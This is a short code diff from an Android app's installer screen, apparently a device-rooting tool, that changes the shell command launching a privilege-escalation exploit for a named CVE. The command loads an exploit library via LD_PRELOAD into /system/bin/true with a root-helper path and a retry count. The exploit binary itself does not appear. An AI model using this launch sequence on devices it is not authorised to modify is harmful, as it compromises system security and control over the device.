@@ -198,13 +198,13 @@ class InstallViewModel(application: Application) : AndroidViewModel(application)
         val process = if (shizuku) {
             val stagedPayload = shizukuStage(payload, SHIZUKU_PAYLOAD_PATH, "755")
             appendLog("[diag] Shizuku branch: payload=${stagedPayload.absolutePath}")
-            // v0.2.26+: 新架构 payload 用 LD_PRELOAD 方式启动（对齐 F7310 App 命令）
-            // CVE43499_ROOT_HELPER=... EXPLOIT_ATTEMPTS=24 PSELECT_DELAY_USEC=20000 LD_PRELOAD=<payload> /system/bin/true
+            // v0.2.28+: 完全对齐 s9180-root-kit 工具包/F7310 App 的命令
+            // CVE43499_ROOT_HELPER=/data/local/tmp/cve-2026-43499-root EXPLOIT_ATTEMPTS=N LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true
             ShizukuController.exec(
                 arrayOf(
                     "/system/bin/sh",
                     "-c",
-                    "CVE43499_ROOT_HELPER=${shellQuote(helper.absolutePath)} EXPLOIT_ATTEMPTS=$EXPLOIT_ATTEMPTS PSELECT_DELAY_USEC=20000 LD_PRELOAD=${shellQuote(stagedPayload.absolutePath)} /system/bin/true",
+                    "CVE43499_ROOT_HELPER=${shellQuote(helper.absolutePath)} EXPLOIT_ATTEMPTS=$EXPLOIT_ATTEMPTS LD_PRELOAD=${shellQuote(stagedPayload.absolutePath)} /system/bin/true 2>&1",
                 ),
                 emptyArray(),
             )
